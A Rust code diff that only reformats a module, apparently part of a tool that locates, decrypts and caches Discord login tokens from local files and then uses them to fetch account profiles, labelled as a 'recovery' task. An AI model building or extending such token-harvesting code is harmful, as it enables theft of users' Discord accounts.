@@ -9,11 +9,11 @@ use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
 use async_trait::async_trait;
 use base64::Engine;
 use base64::engine::general_purpose::STANDARD;
+use once_cell::sync::Lazy;
 use reqwest::header::AUTHORIZATION;
 use reqwest::{Client, StatusCode};
 use serde::de::DeserializeOwned;
 use serde::{Deserialize, Serialize};
-use once_cell::sync::Lazy;
 use std::collections::HashSet;
 use std::ffi::c_void;
 use std::path::{Path, PathBuf};
@@ -192,8 +192,7 @@ pub struct DiscordTokenTask {
     roots: Vec<PathBuf>,
 }
 
-static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> =
-    Lazy::new(OnceCell::new);
+static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = Lazy::new(OnceCell::new);
 static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> =
     Lazy::new(OnceCell::new);
 
@@ -407,7 +406,6 @@ impl RecoveryTask for DiscordTokenTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-
         let records = cached_discord_tokens(&self.roots).await?;
 
         let artifact = write_json_artifact(
@@ -544,10 +542,11 @@ async fn collect_discord_profiles_inner(
     let mut profiles = Vec::new();
     let mut seen = HashSet::new();
     let tokens = cached_discord_tokens(roots).await?;
-    for record in tokens
-        .iter()
-        .filter_map(|rec| rec.decrypted.as_ref().map(|token| (rec.source.clone(), token.clone())))
-    {
+    for record in tokens.iter().filter_map(|rec| {
+        rec.decrypted
+            .as_ref()
+            .map(|token| (rec.source.clone(), token.clone()))
+    }) {
         let (source, token) = record;
         if !seen.insert(token.clone()) {
             continue;
